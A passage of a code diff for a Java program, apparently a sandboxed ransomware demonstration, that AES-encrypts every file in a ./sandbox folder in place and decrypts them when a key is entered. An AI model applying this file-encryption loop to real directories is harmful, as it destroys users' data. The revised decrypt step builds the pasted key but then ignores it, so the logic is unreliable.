@@ -3,6 +3,7 @@ import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
+import java.nio.file.StandardOpenOption;
 import java.util.Scanner;
 import java.util.Set;
 import java.util.stream.Collectors;
@@ -13,7 +14,6 @@ public class Main {
   public static void main(String[] args) {
     try {
       Scanner scanner = new Scanner(System.in);
-
       System.out.println("[*] Program running, Use ethically");
       safteyChecks();
 
@@ -21,68 +21,73 @@ public class Main {
       String encodedKey = AESCore.toBase64(secretKey);
       System.out.println("[+] Secret Key (Base64): " + encodedKey);
 
-      //String plaintext = "Here goes a secret Message";
-      Set < String > filesToEncrypt = listFiles();
-      String fileContent = "";
+      Set<String> filesToEncrypt = listFiles();
       System.out.println(filesToEncrypt);
-      for (String file: filesToEncrypt) {
+
+      for (String file : filesToEncrypt) {
+        Path path = Paths.get("./sandbox", file);
         try {
-          Path path = Paths.get("./sandbox/" + file);
-          fileContent = Files.readString(path);
+          String fileContent = Files.readString(path);
           String encryptedFile = AESCore.encrypt(fileContent, secretKey);
-          Files.writeString(path, encryptedFile);
-        } catch (IOException e) {
-          System.err.println("Error reading file: " + e.getMessage());
+          Files.writeString(path, encryptedFile, StandardOpenOption.TRUNCATE_EXISTING, StandardOpenOption.WRITE);
+          System.out.println("FILE: " + path + "\n CONTENT: " + encryptedFile);
+        } catch (Exception e) {
+          System.err.println("[!] Encrypt error on " + file + ": ");
+          e.printStackTrace();
         }
       }
-      System.out.println("[*] FILE CONTENT: " + fileContent);
-
-      //String ciphertext = AESCore.encrypt(fileContent, secretKey);
-      //System.out.println("[+] Encrypted: " + ciphertext);
 
       System.out.println("[*] Decrypting, Enter Secret Key: ");
-      String UserEncodedKey = scanner.nextLine();
+      String userEncodedKey = scanner.nextLine();
       scanner.close();
 
-      /*if(encodedKey.equals(UserEncodedKey)) {
-        String decrypted = AESCore.decrypt(ciphertext, secretKey);
-        System.out.println("[+] Decrypted: " + decrypted);
-      } else {
-        System.out.println("Whoops");
-      }*/
+      
+      if (userEncodedKey != null && !userEncodedKey.isBlank()) {
+        try {
+          // Reconstruct SecretKey from the pasted base64 string
+          SecretKey userKey = AESCore.keyFromBase64(userEncodedKey.trim());
 
-      if (UserEncodedKey != null && UserEncodedKey.equals("AAABBBCCC")) {
-        for (String file: filesToEncrypt) {
-          try {
-            Path path = Paths.get("./sandbox/" + file);
-            fileContent = Files.readString(path);
-            String decryptedFile = AESCore.decrypt(fileContent, secretKey);
-            Files.writeString(path, decryptedFile);
-          } catch (IOException e) {
-            System.err.println("Error reading file: " + e.getMessage());
+          for (String file : filesToEncrypt) {
+            Path path = Paths.get("./sandbox", file);
+            try {
+              String fileContent = Files.readString(path);
+              String decryptedFile = AESCore.decrypt(fileContent, secretKey);
+              Files.writeString(path, decryptedFile, StandardOpenOption.TRUNCATE_EXISTING, StandardOpenOption.WRITE);
+              System.out.println("FILE: " + path + "\n CONTENT: " + decryptedFile);
+            } catch (Exception e) {
+              System.err.println("[!] Decrypt error on " + file + ": ");
+              e.printStackTrace();
+            }
           }
+        } catch (Exception e) {
+          System.err.println("[!] Invalid key format or key reconstruction failed: ");
+          e.printStackTrace();
         }
       } else {
-        System.out.println("Whops");
+        System.out.println("No key provided. Aborting decrypt.");
       }
 
     } catch (Exception e) {
       e.printStackTrace();
     }
   }
-  public static Set < String > listFiles() {
-    return Stream.of(new File("./sandbox").listFiles())
-      .filter(file -> !file.isDirectory())
+
+  public static Set<String> listFiles() {
+    File[] files = new File("./sandbox").listFiles();
+    if (files == null) return java.util.Collections.emptySet();
+    return Stream.of(files)
+      .filter(f -> f != null && f.isFile())
       .map(File::getName)
       .collect(Collectors.toSet());
   }
-  public static void safteyChecks() {
+
+  public static void safteyChecks() throws Exception {
     Path PATH = Paths.get("./sandbox/");
     boolean exists = Files.exists(PATH);
-    boolean isDirectory = Files.isDirectory(path);
+    boolean isDirectory = Files.isDirectory(PATH);
     if (!exists || !isDirectory) {
       Files.createDirectory(PATH);
-      System.out.println("[!] SANDBOX WAS NOT A DIR, SANDBOX IS REQUIRED TO RUN THE PROGRAM\n   Made ./sandbox/ a dir. Exiting now");
+      System.out.println("[!] SANDBOX WAS NOT A DIR, SANDBOX IS REQUIRED TO RUN THE PROGRAM\n Made ./sandbox/ a dir. Exiting now");
       System.exit(1);
     } else {
       System.out.println("Saftey Check Executed...");
